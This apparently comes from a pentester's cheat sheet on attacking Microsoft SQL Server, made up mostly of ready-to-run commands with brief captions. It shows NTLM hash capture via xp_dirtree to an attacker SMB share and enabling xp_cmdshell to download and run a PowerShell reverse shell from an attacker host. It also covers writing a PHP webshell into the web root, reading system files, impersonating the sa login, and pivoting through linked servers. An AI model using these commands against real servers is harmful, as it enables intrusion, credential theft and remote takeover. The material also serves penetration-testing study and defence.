# MSSQL

```
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

`MSSQL` default system schemas/databases:

* `master` - keeps the information for an instance of SQL Server.
* `msdb` - used by SQL Server Agent.
* `model` - a template database copied for each new database.
* `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
* `tempdb` - keeps temporary objects for SQL queries.

## Login it to mssql remotely

```
sqsh -S $ip -U sa -P <PASSWORD>
```

alternatively use

```
mssqlclient.py user:password@$ip -windows-auth
```

or without --windows-auth

```
mssqlclient.py user:password@$ip
```

## Interactive with MSSQL

Check for users with SA level permissions (users that can enable xp\_cmdshell)

```
select IS_SRVROLEMEMBER ('sysadmin')
```

Run after spinning up an smbserver to capture hash

```
exec master..xp_dirtree '\\<attacker ip>\<share name>\',1,1
GO
```

```
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

**Check if xp\_cmdshell is enabled**

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

**Show Advanced Options**

```
sp_configure 'show advanced options', '1'
```

```
RECONFIGURE
```

**Enable xp\_cmdshell**

```
sp_configure 'xp_cmdshell', '1'
```

```
RECONFIGURE
```

```
EXEC master..xp_cmdshell 'whoami'
```

{% code overflow="wrap" %}
```
xp_cmdshell powershell iex(new-objectnet.webclient).downloadstring(\"http://AttackerIP/Invoke-PowerShellTcp.ps1\")
```
{% endcode %}



## Enable File Write (Ole Automation Procedures)

{% code overflow="wrap" %}
```
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption><p>To write files using <code>MSSQL</code>, we need to enable <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">Ole Automation Procedures</a>, which requires admin privileges, and then execute some stored procedures to create the file</p></figcaption></figure>

## Write File

<pre data-overflow="wrap"><code><strong>DECLARE @OLE INT
</strong>DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&#x3C;?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
</code></pre>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## Read File

{% code overflow="wrap" %}
```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>By default, <code>MSSQL</code> allows file read on any file in the operating system to which the account has read access</p></figcaption></figure>

### Impersonate Existing Users

**Identify Users that We Can Impersonate**

{% code overflow="wrap" %}
```
select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE'
GO
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption><p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.</p></figcaption></figure>

**Verifying our Current User and Role**

{% code overflow="wrap" %}
```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption><p>the returned value <code>0</code> indicates, we do not have the sysadmin role, but we can impersonate the <code>sa</code> user</p></figcaption></figure>

**Impersonating the SA User**

{% code overflow="wrap" %}
```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption><p> It's recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using <code>USE master</code>We can now execute any command as a sysadmin as the returned value <code>1</code> indicates.</p></figcaption></figure>

### Communicate with Other Databases with MSSQL

**Identify linked Servers in MSSQL**

<pre class="language-cmd-session"><code class="lang-cmd-session"><strong>SELECT srvname, isremote FROM sysservers
</strong>GO
</code></pre>

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption><p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. As we can see in the query's output, we have the name of the server and the column <code>isremote</code>, where <code>1</code> means is a remote server, and <code>0</code> is a linked server</p></figcaption></figure>

{% code overflow="wrap" %}
```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption><p>Attempt to identify the user used for the connection and its privileges. The <a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql">EXECUTE</a> statement can be used to send pass-through commands to linked servers. If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p></figcaption></figure>
